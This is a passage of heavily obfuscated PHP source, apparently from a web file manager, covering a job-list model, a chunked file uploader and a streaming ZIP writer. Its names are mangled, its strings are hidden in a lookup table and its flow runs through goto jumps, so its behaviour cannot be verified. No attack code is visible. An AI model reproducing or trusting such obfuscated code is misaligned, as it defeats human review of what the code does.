$cíÛÚ”Ñ[$cõ›æ½Æ’³[385]] = $AéùË¶¾Ê[$C¼“¢øŸ×]; $this->where($cíÛÚ”Ñ)->save(array($cõ›æ½Æ’³[2131] => $C¼“¢øŸ× + 1)); } return !0; } protected function moveTop($cã§¼ÔÊ½ë) { goto cšíĞ­›¼Ä; cšíĞ­›¼Ä: $F…ˆÈ´Ã–ì =& $_SERVER[ã®Â„Éæ¹¤]; $fæ‚ˆÂáº‡ = array($F…ˆÈ´Ã–ì[1447] => USER_ID, $F…ˆÈ´Ã–ì[436] => 0); $A”…º’§øó = $this->where($fæ‚ˆÂáº‡)->where(array($F…ˆÈ´Ã–ì[28] => $cã§¼ÔÊ½ë))->find(); goto B­¶Ò†àö¢; B­¶Ò†àö¢: if (!$A”…º’§øó) { return; } $F‘®ŞÕÆ• = $this->field($F…ˆÈ´Ã–ì[367])->where($fæ‚ˆÂáº‡)->order($F…ˆÈ´Ã–ì[2540])->select(); $F‘®ŞÕÆ• = array_to_keyvalue($F‘®ŞÕÆ•, $F…ˆÈ´Ã–ì[33], $F…ˆÈ´Ã–ì[367]); goto EÙßÉ°ÁÒº; EÙßÉ°ÁÒº: $C…ËÎ‡›ô = $F‘®ŞÕÆ•; $F‘®ŞÕÆ• = array_remove_value($F‘®ŞÕÆ•, $A”…º’§øó[$F…ˆÈ´Ã–ì[367]]); array_unshift($F‘®ŞÕÆ•, $A”…º’§øó[$F…ˆÈ´Ã–ì[367]]); goto eöáØáÉ’…; eöáØáÉ’…: return $this->resetSort($F‘®ŞÕÆ•); goto dÙôÜç±º; dÙôÜç±º: } protected function moveBottom($dšÆÓâãå) { $A–ÔÖ…£¾  =& $_SERVER[ã®Â„Éæ¹¤]; $FÅÉ¨àæ„ = array($A–ÔÖ…£¾ [1447] => USER_ID, $A–ÔÖ…£¾ [436] => 0); $Dƒ‚¨ „—« = $this->where($FÅÉ¨àæ„)->max($A–ÔÖ…£¾ [2149]); $c†Èí†Ì¦ = array($A–ÔÖ…£¾ [2149] => $Dƒ‚¨ „—« + 1); return $this->where($FÅÉ¨àæ„)->where(array($A–ÔÖ…£¾ [28] => $dšÆÓâãå))->save($c†Èí†Ì¦); } private function getAutoName($E£èˆì®¢‚) { goto d¦¶ù×…ªŠ; aÃÈ¾ãíªÁ: $bˆğ½é¡Ë = array_to_keyvalue($bˆğ½é¡Ë, $a†½çÖÓá[33], $a†½çÖÓá[28]); if (!$bˆğ½é¡Ë || !in_array($E£èˆì®¢‚, $bˆğ½é¡Ë)) { return $E£èˆì®¢‚; } for ($EêùÎ†Äáç = 0; $EêùÎ†Äáç < count($bˆğ½é¡Ë); $EêùÎ†Äáç++) { if (!in_array($E£èˆì®¢‚ . "\x28{$EêùÎ†Äáç}\51", $bˆğ½é¡Ë)) { return $E£èˆì®¢‚ . "\50{$EêùÎ†Äáç}\51"; } } goto AÑªã”‡š; AÑªã”‡š: return $E£èˆì®¢‚ . "\x28{$EêùÎ†Äáç}\x29"; goto Eƒã·ƒ°«; d¦¶ù×…ªŠ: $a†½çÖÓá =& $_SERVER[ã®Â„Éæ¹¤]; $A°ä¬†÷× = array($a†½çÖÓá[1447] => USER_ID, $a†½çÖÓá[436] => 0); $bˆğ½é¡Ë = $this->field($a†½çÖÓá[28])->where($A°ä¬†÷×)->select(); goto aÃÈ¾ãíªÁ; Eƒã·ƒ°«: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\152\x6f\142\114\151\x73\164"; public $field = array("\x6e\141\x6d\145", "\144\145\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\163\145\x6c\146\x4a\157\x62\114\151\x73\164"; public function listData($a²á”±îÙ = false, $eøìŒ¢ ˆÈ = "\x73\157\162\164", $A½¢ö»ÛÄ = false) { return parent::listData($a²á”±îÙ, $eøìŒ¢ ˆÈ, $A½¢ö»ÛÄ); } public function remove($A¹½Éã¨–ä) { return parent::remove($A¹½Éã¨–ä); } public function add($B¹µËŠáÎ) { $fßË£„›ÕÎ =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->findByName($B¹µËŠáÎ[$fßË£„›ÕÎ[28]])) { return !1; } $B¹µËŠáÎ[$fßË£„›ÕÎ[2149]] = $this->getSort(); return parent::insert($B¹µËŠáÎ); } private function getSort() { $b‚¬‡éŠ¢Ú =& $_SERVER[ã®Â„Éæ¹¤]; $FÍÏà²†âë = parent::listData(); $aÚ¦™öãÅ” = array_to_keyvalue($FÍÏà²†âë, $b‚¬‡éŠ¢Ú[33], $b‚¬‡éŠ¢Ú[2149]); return empty($aÚ¦™öãÅ”) ? 0 : max($aÚ¦™öãÅ”) + 1; } public function update($Bö­ÎĞÍ, $b¢¡©”•Û) { $b¿î»§ ¼ø =& $_SERVER[ã®Â„Éæ¹¤]; $AæÔòÄß = parent::listData($Bö­ÎĞÍ); $EÜôØÜŞá‹ = $this->findByName($b¢¡©”•Û[$b¿î»§ ¼ø[28]]); if (!$AæÔòÄß || $EÜôØÜŞá‹ && $EÜôØÜŞá‹[$b¿î»§ ¼ø[367]] != $AæÔòÄß[$b¿î»§ ¼ø[367]]) { return !1; } return parent::update($Bö­ÎĞÍ, $b¢¡©”•Û); } public function setUserJob($aÈ½‚Á†œ©, $cƒ˜½¯Î­™) { goto a‘ñâ¢‰³¦; cïÉèâ À×: $c”Ğ…ŠØÑÔ = rtrim($c”Ğ…ŠØÑÔ, $C”¨ÜŒˆÙ[47]); Model($C”¨ÜŒˆÙ[479])->metaSet($aÈ½‚Á†œ©, self::JOB_KEY, $c”Ğ…ŠØÑÔ); goto cäƒÚ‡®ôÚ; a‘ñâ¢‰³¦: $C”¨ÜŒˆÙ =& $_SERVER[ã®Â„Éæ¹¤]; if (!is_array($cƒ˜½¯Î­™)) { $cƒ˜½¯Î­™ = array($cƒ˜½¯Î­™); } $DÍ¢­ôŸ³ = parent::listData(); goto Dè“¯»Ï¶ˆ; Dè“¯»Ï¶ˆ: $fÅ¨¥ìÌ˜ = array_to_keyvalue($DÍ¢­ôŸ³, $C”¨ÜŒˆÙ[28]); $c”Ğ…ŠØÑÔ = $C”¨ÜŒˆÙ[361]; foreach ($cƒ˜½¯Î­™ as $D»­ÏßÑ) { if ($fÅ¨¥ìÌ˜[$D»­ÏßÑ]) { $c”Ğ…ŠØÑÔ .= $fÅ¨¥ìÌ˜[$D»­ÏßÑ][$C”¨ÜŒˆÙ[367]] . $C”¨ÜŒˆÙ[47]; } else { $Dé²¤¹« = $this->add($D»­ÏßÑ); $c”Ğ…ŠØÑÔ .= $Dé²¤¹« . $C”¨ÜŒˆÙ[47]; } } goto cïÉèâ À×; cäƒÚ‡®ôÚ: } public function getUserJob($FöŠ´·­Â) { $dà¶­êğÈ´ = Model($_SERVER[ã®Â„Éæ¹¤][479])->metaGet($FöŠ´·­Â); return $this->getUserJobInfo($dà¶­êğÈ´[self::JOB_KEY]); } public function getUserJobInfo($aíÑ‹öœ‘) { goto cïÈç÷¼¶×; cïÈç÷¼¶×: $FŞğÔĞ«¶ =& $_SERVER[ã®Â„Éæ¹¤]; $Dêãçìã = explode($FŞğÔĞ«¶[47], $aíÑ‹öœ‘); $aœÒ…ì„œŸ = parent::listData(); goto f—Òì«¢‘Ø; f—Òì«¢‘Ø: $aœÒ…ì„œŸ = array_remove_key($aœÒ…ì„œŸ, $FŞğÔĞ«¶[187]); $B—¤…ŠÃÇ£ = array(); foreach ($Dêãçìã as $Cà¼÷Ó´) { if (isset($aœÒ…ì„œŸ[$Cà¼÷Ó´])) { $B—¤…ŠÃÇ£[] = $aœÒ…ì„œŸ[$Cà¼÷Ó´]; } } goto Eêé’ª¨„; Eêé’ª¨„: return $B—¤…ŠÃÇ£; goto A¾ÛÖ‹Ë©Á; A¾ÛÖ‹Ë©Á: } } goto d«™ºÖ²º±; eãÌİ©Ú‚²: define($_SERVER[ã®Â„Éæ¹¤][1957], 4); define($_SERVER[ã®Â„Éæ¹¤][1958], 5); define($_SERVER[ã®Â„Éæ¹¤][1959], 16); goto d¡Æ¾ôô³ù; C¡¶—÷“•: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto a…“¨çÅÓè; D‰–¦¡š—À: $this->checkSize(); $this->tempPathInit(); goto d­ÉğàøÑ®; CÇˆ¸îËöê: if (!empty($_FILES)) { $bÓ®§©œ¥ß = $_FILES[$e¹¶™èğ¨·[167]]; $this->uploadFile = $bÓ®§©œ¥ß[$e¹¶™èğ¨·[1989]]; if (!$this->uploadFile && $bÓ®§©œ¥ß[$e¹¶™èğ¨·[1237]] > 0) { show_json($this->errorInfo($bÓ®§©œ¥ß[$e¹¶™èğ¨·[1237]]), !1); } } else { if (isset($in[$e¹¶™èğ¨·[386]])) { $this->uploadFile = isset($in[$e¹¶™èğ¨·[1990]]) ? $e¹¶™èğ¨·[1991] : $e¹¶™èğ¨·[1834]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto D‰–¦¡š—À; a…“¨çÅÓè: $e¹¶™èğ¨· =& $_SERVER[ã®Â„Éæ¹¤]; global $in; $this->in =& $in; goto CÇˆ¸îËöê; d­ÉğàøÑ®: } public function upload() { goto E‘øø¤¿µ®; CŠ÷ÒĞ¤µŞ: if ($aòíÉ¹ï¾ƒ > 1 && $aÌƒË™Üë <= 0) { show_json($f¿´ Œéë¸[1996], !1); } if ($aÌƒË™Üë > $CÎ†ˆâé§Ä) { $aòíÉ¹ï¾ƒ = 1; } if ($aòíÉ¹ï¾ƒ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto fÔ­ŠÔËîÕ; FÉÒù‘ÍáÍ: $c°‹í¨± = $this->writeTo($AÌÔã¡¬Æ, $Aƒİì’§ä, $this->tempFile); $d¤šÍËó¿½ = IO::hashSimple($AÌÔã¡¬Æ); $CÎ†ˆâé§Ä = IO::size($AÌÔã¡¬Æ); goto c¹èƒàùë“; fÔ­ŠÔËîÕ: CacheLock::lock($this->tempFile, 20); $C„ÒĞ™Õğé = $this->statusGet(); $this->initFileTemp(); goto eÑÊÔì¾Ó¼; A¡ô„ï…æŒ: $AáßñœÖÛ™ = $this->tempFile . $f¿´ Œéë¸[1994] . $cÛ˜ğÕˆÄ›; $CÎ†ˆâé§Ä = isset($this->in[$f¿´ Œéë¸[522]]) ? intval($this->in[$f¿´ Œéë¸[522]]) : 0; $aÌƒË™Üë = isset($this->in[$f¿´ Œéë¸[1995]]) ? intval($this->in[$f¿´ Œéë¸[1995]]) : 0; goto CŠ÷ÒĞ¤µŞ; E‘øø¤¿µ®: $f¿´ Œéë¸ =& $_SERVER[ã®Â„Éæ¹¤]; $cÛ˜ğÕˆÄ› = isset($this->in[$f¿´ Œéë¸[1992]]) ? intval($this->in[$f¿´ Œéë¸[1992]]) : 0; $aòíÉ¹ï¾ƒ = isset($this->in[$f¿´ Œéë¸[1993]]) ? intval($this->in[$f¿´ Œéë¸[1993]]) : 1; goto A¡ô„ï…æŒ; c¹èƒàùë“: @unlink($AÌÔã¡¬Æ); if (!$c°‹í¨±) { $this->showJson($f¿´ Œéë¸[2000] . $cÛ˜ğÕˆÄ›, !1); } $C„ÒĞ™Õğé[$f¿´ Œéë¸[2001]] = $aòíÉ¹ï¾ƒ; goto CÛìšÅœ½Š; CÛìšÅœ½Š: $C„ÒĞ™Õğé[$f¿´ Œéë¸[2002]][$f¿´ Œéë¸[2003] . $cÛ˜ğÕˆÄ›] = array($f¿´ Œéë¸[2004] => $F¥ô±¸½õÊ, $f¿´ Œéë¸[1055] => $cÛ˜ğÕˆÄ›, $f¿´ Œéë¸[77] => $CÎ†ˆâé§Ä, $f¿´ Œéë¸[164] => $d¤šÍËó¿½); $this->statusSet($C„ÒĞ™Õğé); if (count($C„ÒĞ™Õğé[$f¿´ Œéë¸[2002]]) != $C„ÒĞ™Õğé[$f¿´ Œéë¸[2001]]) { $this->showJson($f¿´ Œéë¸[2005] . $cÛ˜ğÕˆÄ›, !0); } goto bàë¼¿ÔÑß; eÑÊÔì¾Ó¼: $AÌÔã¡¬Æ = $this->moveUploadedFile($AáßñœÖÛ™); if ($CÎ†ˆâé§Ä > 0 && filesize($AÌÔã¡¬Æ) == 0) { $this->showJson($f¿´ Œéë¸[1997], !1); } if (!$AÌÔã¡¬Æ) { $this->showJson(LNG($f¿´ Œéë¸[1998]), !1); } goto FÌ´Œ°äÉĞ; f–ºåˆğµÔ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto F«±ª”ˆ©Î; bàë¼¿ÔÑß: ignore_timeout(); if (!$this->checkChunkHash($C„ÒĞ™Õğé)) { $this->showJson($f¿´ Œéë¸[2006], !1); } $this->statusSet(!1); goto f–ºåˆğµÔ; FÌ´Œ°äÉĞ: $F¥ô±¸½õÊ = $cÛ˜ğÕˆÄ› * $aÌƒË™Üë; $Aƒİì’§ä = @fopen($this->tempFile, $f¿´ Œéë¸[1999]); fseek_64($Aƒİì’§ä, $F¥ô±¸½õÊ); goto FÉÒù‘ÍáÍ; F«±ª”ˆ©Î: } private function checkSize() { $c›Û…ÊĞ¾ =& $_SERVER[ã®Â„Éæ¹¤]; if (phpBuild64() || $this->in[$c›Û…ÊĞ¾[77]] < PHP_INT_MAX) { return; } show_json(LNG($c›Û…ÊĞ¾[2007]), !1); } private function showJson($d•†÷Ëª, $DèÌ¾Ô²²) { CacheLock::unlock($this->tempFile); if (!$DèÌ¾Ô²²) { return show_json($d•†÷Ëª, $DèÌ¾Ô²²); } show_json($d•†÷Ëª, $DèÌ¾Ô²²); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto D…ô³ÍˆëÄ; aí˜Ë†¦¼º: touch($Eè©¤¡õ . $Aº•ŸãÖ÷[2008]); $Fˆç°¢ï‘† = isset($this->in[$Aº•ŸãÖ÷[2009]]) ? $this->in[$Aº•ŸãÖ÷[2009]] : !1; if (strlen($Fˆç°¢ï‘†) < 30) { $Fˆç°¢ï‘† = md5(USER_ID . $this->in[$Aº•ŸãÖ÷[75]] . $this->fileName . $this->in[$Aº•ŸãÖ÷[77]]); } goto b°èàƒ·“Â; b°èàƒ·“Â: $this->tempFile = $Eè©¤¡õ . $Aº•ŸãÖ÷[2010] . md5($Fˆç°¢ï‘† . $this->in[$Aº•ŸãÖ÷[1551]]); goto f¦Üß——Ÿø; D…ô³ÍˆëÄ: $Aº•ŸãÖ÷ =& $_SERVER[ã®Â„Éæ¹¤]; $Eè©¤¡õ = TEMP_FILES; @mk_dir($Eè©¤¡õ); goto aí˜Ë†¦¼º; f¦Üß——Ÿø: } private function moveUploadedFile($Aº¿¢‰ˆ) { $c­òèçªéÀ =& $_SERVER[ã®Â„Éæ¹¤]; $EÅÒ¥ƒ²‘‡ = $this->uploadFile; if ($EÅÒ¥ƒ²‘‡ == $c­òèçªéÀ[2011]) { @file_put_contents($Aº¿¢‰ˆ, base64_decode($_REQUEST[$c­òèçªéÀ[2012]])); } else { if ($EÅÒ¥ƒ²‘‡ == $c­òèçªéÀ[1834]) { $CÁƒ²äéš = @fopen($Aº¿¢‰ˆ, $c­òèçªéÀ[1541]); $this->writeTo($EÅÒ¥ƒ²‘‡, $CÁƒ²äéš, $Aº¿¢‰ˆ); } else { if (!move_uploaded_file($EÅÒ¥ƒ²‘‡, $Aº¿¢‰ˆ)) { return !1; } } } return $Aº¿¢‰ˆ; } private function writeTo($AÒöÍ¯„ù¡, $e–ÃÀÏÄ», $AÊ‚…ªéƒ) { goto eî¢É‰òÒ; FÛ´Ñ—½Şò: fclose($BÙçàÛğ); fclose($e–ÃÀÏÄ»); CacheLock::unlock($bÖ§’‡¼‹); goto E„Õöè»¡ò; bˆàÜŒĞŠÃ: $BÙçàÛğ = @fopen($AÒöÍ¯„ù¡, $dİ§©øÑ¼Â[1540]); if (!$BÙçàÛğ || !$e–ÃÀÏÄ» || !$Dñ¼½­Ìç¹) { CacheLock::unlock($bÖ§’‡¼‹); return !1; } while (!feof($BÙçàÛğ)) { fwrite($e–ÃÀÏÄ», fread($BÙçàÛğ, 1024 * 200)); } goto FÛ´Ñ—½Şò; eî¢É‰òÒ: $dİ§©øÑ¼Â =& $_SERVER[ã®Â„Éæ¹¤]; $bÖ§’‡¼‹ = $dİ§©øÑ¼Â[2013] . $AÊ‚…ªéƒ; $Dñ¼½­Ìç¹ = CacheLock::lock($bÖ§’‡¼‹, 1); goto bˆàÜŒĞŠÃ; E„Õöè»¡ò: return !0; goto FŒÛ¿£°±; FŒÛ¿£°±: } private function statusGet() { goto F”³í¢Äõ; A‹ìùŒÊùß: if (!$this->statusData) { $fÆƒ¯îÛæ = array($E³å”„ò[28] => $this->fileName, $E³å”„ò[2001] => 0, $E³å”„ò[2002] => array()); $this->statusSet($fÆƒ¯îÛæ); } return $this->statusData; goto fİ§”Å«Ê; CÜ§¬¨©£Ñ: $C±‡•İºö = !1; if (file_exists($BŠ‚¼¥¤Ãó)) { $C±‡•İºö = @file_get_contents($BŠ‚¼¥¤Ãó); } if ($C±‡•İºö) { $this->statusData = json_decode($C±‡•İºö, !0); } goto A‹ìùŒÊùß; F”³í¢Äõ: $E³å”„ò =& $_SERVER[ã®Â„Éæ¹¤]; if (is_array($this->statusData)) { return $this->statusData; } $BŠ‚¼¥¤Ãó = $this->tempFile . $E³å”„ò[2014]; goto CÜ§¬¨©£Ñ; fİ§”Å«Ê: } public function statusSet($aÆŠçò¾«) { $b¡º‹è‰ÅŠ = $this->tempFile . $_SERVER[ã®Â„Éæ¹¤][2014]; if (!$aÆŠçò¾«) { if (file_exists($b¡º‹è‰ÅŠ)) { @unlink($b¡º‹è‰ÅŠ); } return !0; } $this->statusData = $aÆŠçò¾«; return file_put_contents($b¡º‹è‰ÅŠ, json_encode($aÆŠçò¾«)); } private function initFileTemp() { $D†„Ù‡èáË =& $_SERVER[ã®Â„Éæ¹¤]; if (file_exists($this->tempFile)) { return; } $D·›®ë„Š = fopen($this->tempFile, $D†„Ù‡èáË[2015]); fseek_64($D·›®ë„Š, $this->in[$D†„Ù‡èáË[77]] - 1, SEEK_SET); fwrite($D·›®ë„Š, $D†„Ù‡èáË[470]); fclose($D·›®ë„Š); } public function checkChunk() { goto b×º£Ûìİ; FîïÀôö: $EÄØ·„­¿Û = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($EÄØ·„­¿Û[$eÍ×»ãã¹Ê[2002]] as $DÌğ¾ñÙÖ) { $E½ˆÎ®¯¤ö = $DÌğ¾ñÙÖ[$eÍ×»ãã¹Ê[164]]; if ($E½ˆÎ®¯¤ö) { $CÛƒ”®¬¯[$eÍ×»ãã¹Ê[2016] . $DÌğ¾ñÙÖ[$eÍ×»ãã¹Ê[1055]]] = $E½ˆÎ®¯¤ö; } } goto bóÛ½×öª™; bóÛ½×öª™: return $CÛƒ”®¬¯; goto d‰Â©²Ç¤„; b×º£Ûìİ: $eÍ×»ãã¹Ê =& $_SERVER[ã®Â„Éæ¹¤]; $CÛƒ”®¬¯ = array(); CacheLock::lock($this->tempFile); goto FîïÀôö; d‰Â©²Ç¤„: } private function checkChunkHash($Fµ“”ùªïò) { goto D¹™¶˜ØÎÕ; fÊø©××™: return $c…ƒ¯ì•á; goto fñ÷¬Í—À ; D®­’–áÚ©: $c…ƒ¯ì•á = !0; foreach ($Fµ“”ùªïò[$CŒ™ñªøïÊ[2002]] as $d‘îÅÉÌÍ²) { fseek_64($eÀäÌ³Óæ», $d‘îÅÉÌÍ²[$CŒ™ñªøïÊ[2004]]); $E‘ĞÀ†Ğ‚£ = PathDriverStream::hash($eÀäÌ³Óæ», $d‘îÅÉÌÍ²[$CŒ™ñªøïÊ[77]]); if ($d‘îÅÉÌÍ²[$CŒ™ñªøïÊ[164]] != $E‘ĞÀ†Ğ‚£) { $c…ƒ¯ì•á = !1; break; } } fclose($eÀäÌ³Óæ»); goto fÊø©××™; D¹™¶˜ØÎÕ: $CŒ™ñªøïÊ =& $_SERVER[ã®Â„Éæ¹¤]; if (count($Fµ“”ùªïò[$CŒ™ñªøïÊ[2002]]) != $Fµ“”ùªïò[$CŒ™ñªøïÊ[2001]]) { return !1; } $DÔ„‹É•¼Ñ = _get($this->in, $CŒ™ñªøïÊ[2009]); goto E¿åãåÃÑ; E¿åãåÃÑ: $c²•öÛƒ³ê = _get($this->in, $CŒ™ñªøïÊ[2017]); if (strlen($c²•öÛƒ³ê) == 32 && IO::hashSimple($this->tempFile) == $DÔ„‹É•¼Ñ && IO::hashMd5($this->tempFile) == $c²•öÛƒ³ê) { return !0; } $eÀäÌ³Óæ» = fopen($this->tempFile, $CŒ™ñªøïÊ[1188]); goto D®­’–áÚ©; fñ÷¬Í—À : } public static function fileName() { goto c­Ô¾Õáİ”; cÖÒ­Ö»ø: if (!empty($_FILES)) { $f¹•¶´°íÓ = $f¹•¶´°íÓ ? $f¹•¶´°íÓ : $_FILES[$c•ã‡™ä‚ó[167]][$c•ã‡™ä‚ó[386]]; } if (!is_wap()) { return KodIO::clear($f¹•¶´°íÓ); } $c° ¡ğä¢ = strtotime($in[$c•ã‡™ä‚ó[2018]]); goto dÑä×Ñ«¨ä; dÑä×Ñ«¨ä: $c° ¡ğä¢ = $c° ¡ğä¢ ? $c° ¡ğä¢ : time(); $aŸÍË¶‰¥œ = strtolower($f¹•¶´°íÓ); if ($aŸÍË¶‰¥œ == $c•ã‡™ä‚ó[2019] || $aŸÍË¶‰¥œ == $c•ã‡™ä‚ó[2020]) { $f¹•¶´°íÓ = date($c•ã‡™ä‚ó[712], $c° ¡ğä¢) . $c•ã‡™ä‚ó[70] . $in[$c•ã‡™ä‚ó[77]] . $c•ã‡™ä‚ó[1648]; } else { if ($aŸÍË¶‰¥œ == $c•ã‡™ä‚ó[2021]) { $f¹•¶´°íÓ = date($c•ã‡™ä‚ó[712], $c° ¡ğä¢) . $c•ã‡™ä‚ó[70] . $in[$c•ã‡™ä‚ó[77]] . $c•ã‡™ä‚ó[2022]; } } goto A¢Š­À£Õ; A¢Š­À£Õ: return KodIO::clear($f¹•¶´°íÓ); goto bŞÖÄÊ¤ ; c­Ô¾Õáİ”: $c•ã‡™ä‚ó =& $_SERVER[ã®Â„Éæ¹¤]; global $in; $f¹•¶´°íÓ = isset($in[$c•ã‡™ä‚ó[28]]) ? $in[$c•ã‡™ä‚ó[28]] : $c•ã‡™ä‚ó[33]; goto cÖÒ­Ö»ø; bŞÖÄÊ¤ : } private function errorInfo($a¸ÒÔ¨­Ã) { $D‰¯—“ÏÙ =& $_SERVER[ã®Â„Éæ¹¤]; $e¸˜×†Æõ­ = array($D‰¯—“ÏÙ[2023], $D‰¯—“ÏÙ[2024], $D‰¯—“ÏÙ[2025], $D‰¯—“ÏÙ[2026], $D‰¯—“ÏÙ[2027], $D‰¯—“ÏÙ[2028], $D‰¯—“ÏÙ[2029], $D‰¯—“ÏÙ[2030]); return $a¸ÒÔ¨­Ã . $D‰¯—“ÏÙ[4] . $e¸˜×†Æõ­[$a¸ÒÔ¨­Ã]; } } class ZipMake { const VERSION = "\60\56\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($FÆˆéš÷­Ş = null) { $e†½Š‘ö¦® =& $_SERVER[ã®Â„Éæ¹¤]; $this->outputStream = fopen($e†½Š‘ö¦®[2031], $e†½Š‘ö¦®[1244]); $this->outputName = $FÆˆéš÷­Ş; $this->needHeaders = !0; } public function addFile($B²»òó’“´, $fÊ‚”×â¢) { goto b¥Ê·¨÷ä; C¨Ã²²¢Ö¬: while (!feof($d¡ğŠ¼µ’™)) { $dŸòªÉøÑô = fread($d¡ğŠ¼µ’™, 1048576); $this->send($dŸòªÉøÑô); } fclose($d¡ğŠ¼µ’™); $bçƒá†ëÄ = hexdec(hash_file($EÑ¯ÕêŞ¬½[2033], $fÊ‚”×â¢)); goto bÚÙµ”íğÛ; aŸîŠÆÜÅ…: $Cá±¨ŠâäÙ = $this->addFileHeader($B²»òó’“´, $BÉ£‹Ò¾¸Š); $f›°õÎ·ñœ = $AÖÛ“ŞÄÃë = filesize_64($fÊ‚”×â¢); $d¡ğŠ¼µ’™ = fopen($fÊ‚”×â¢, $EÑ¯ÕêŞ¬½[2032]); goto C¨Ã²²¢Ö¬; bÚÙµ”íğÛ: $this->addFileFooter($B²»òó’“´, $BÉ£‹Ò¾¸Š, $bçƒá†ëÄ, $f›°õÎ·ñœ, $AÖÛ“ŞÄÃë, $Cá±¨ŠâäÙ); goto b³­¯Çƒ²Ç; b¥Ê·¨÷ä: $EÑ¯ÕêŞ¬½ =& $_SERVER[ã®Â„Éæ¹¤]; $B²»òó’“´ = $this->filterFilename($B²»òó’“´); $BÉ£‹Ò¾¸Š = static::METHOD_STORE; goto aŸîŠÆÜÅ…; b³­¯Çƒ²Ç: } public function addFileFromStream($E˜Á›¹ÆøÃ, $Böˆ¢¸¯¬) { goto F¬¶†îøç‰; BŒª¸‹Â‘â: fseek($Böˆ¢¸¯¬, 0, SEEK_END); $Aïá½º½š = $BÛêˆó¡­‘ = ftell($Böˆ¢¸¯¬); rewind($Böˆ¢¸¯¬); goto côÈé®×Œº; F¬¶†îøç‰: $E˜Á›¹ÆøÃ = $this->filterFilename($E˜Á›¹ÆøÃ); $bÃ†ÔØÅÏ´ = static::METHOD_STORE; $C—æŞ¬º = $this->addFileHeader($E˜Á›¹ÆøÃ, $bÃ†ÔØÅÏ´); goto BŒª¸‹Â‘â; Fé¥åÚá‹: $this->addFileFooter($E˜Á›¹ÆøÃ, $bÃ†ÔØÅÏ´, $a×ÚÓ“˜ÔÕ, $Aïá½º½š, $BÛêˆó¡­‘, $C—æŞ¬º); goto Fß†äµšº; côÈé®×Œº: $F‚åöÓá¯Û = hash_init($_SERVER[ã®Â„Éæ¹¤][2033]); while (!feof($Böˆ¢¸¯¬)) { $b¾ô‡ÑÇÄİ = fread($Böˆ¢¸¯¬, 1048576); hash_update($F‚åöÓá¯Û, $b¾ô‡ÑÇÄİ); $this->send($b¾ô‡ÑÇÄİ); } $a×ÚÓ“˜ÔÕ = hexdec(hash_final($F‚åöÓá¯Û)); goto Fé¥åÚá‹; Fß†äµšº: } public function finish() { foreach ($this->files as $A£³«ÌÄ†) { $this->addCdrFile($A£³«ÌÄ†); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($B—İ¯ææ, $eõøâ¬İÅò) { goto fØóÍ°Ä¼Ö; fØóÍ°Ä¼Ö: $EÒ¥“ÃßŒ =& $_SERVER[ã®Â„Éæ¹¤]; $B—İ¯ææ = preg_replace($EÒ¥“ÃßŒ[2034], $EÒ¥“ÃßŒ[33], $B—İ¯ææ); $eÖ¶«ëª¾Ÿ = strlen($B—İ¯ææ); goto AÒ‡·Êä¹è; AÒ‡·Êä¹è: $AøŒŠ‹ÑÔ = $this->dosTime(time()); $e¹›íÆ¥ø = array(array($EÒ¥“ÃßŒ[2035], static::FILE_HEADER_SIGNATURE), array($EÒ¥“ÃßŒ[2036], static::ZIP_VERSION_64), array($EÒ¥“ÃßŒ[2036], 8), array($EÒ¥“ÃßŒ[2036], $eõøâ¬İÅò), array($EÒ¥“ÃßŒ[2035], $AøŒŠ‹ÑÔ), array($EÒ¥“ÃßŒ[2035], 0), array($EÒ¥“ÃßŒ[2035], 4294967295), array($EÒ¥“ÃßŒ[2035], 4294967295), array($EÒ¥“ÃßŒ[2036], $eÖ¶«ëª¾Ÿ), array($EÒ¥“ÃßŒ[2036], 32)); $D£òöÖ‚¦ = array(array($EÒ¥“ÃßŒ[2036], 1), array($EÒ¥“ÃßŒ[2036], 28), array($EÒ¥“ÃßŒ[2037], 0), array($EÒ¥“ÃßŒ[2037], 0), array($EÒ¥“ÃßŒ[2037], 0), array($EÒ¥“ÃßŒ[2035], 0)); goto fÛ‚÷á„îé; A±Ê°«„ö–: return strlen($FÍåä¨¾ğ) + $eÖ¶«ëª¾Ÿ + strlen($fŞí†® ò„); goto DêéÖ‹œĞŒ; fÛ‚÷á„îé: $FÍåä¨¾ğ = $this->packFields($e¹›íÆ¥ø); $fŞí†® ò„ = $this->packFields($D£òöÖ‚¦); $this->send($FÍåä¨¾ğ . $B—İ¯ææ . $fŞí†® ò„); goto A±Ê°«„ö–; DêéÖ‹œĞŒ: } protected function addFileFooter($Aš‡êóöŠ÷, $Aî¹ğÍÏà™, $c£Ñ½³óÔ™, $b½èâÆ‹Ï¤, $Fİ‚Ç×±¯, $D›â±õé»½) { $aŒ§¡ÜĞÙ° =& $_SERVER[ã®Â„Éæ¹¤]; $fÁÜó’½Å = array(array($aŒ§¡ÜĞÙ°[2035], static::DATA_DESCRIPTOR_SIGNATURE), array($aŒ§¡ÜĞÙ°[2035], $c£Ñ½³óÔ™), array($aŒ§¡ÜĞÙ°[2037], $b½èâÆ‹Ï¤), array($aŒ§¡ÜĞÙ°[2037], $Fİ‚Ç×±¯)); $eÚ”â†œ‚Ã = $this->packFields($fÁÜó’½Å); $this->send($eÚ”â†œ‚Ã); $EŒíì‰ê‹Š = $D›â±õé»½ + $b½èâÆ‹Ï¤ + $FÄ”áÆºÑ; $this->addToCdr($Aš‡êóöŠ÷, $Aî¹ğÍÏà™, $c£Ñ½³óÔ™, $b½èâÆ‹Ï¤, 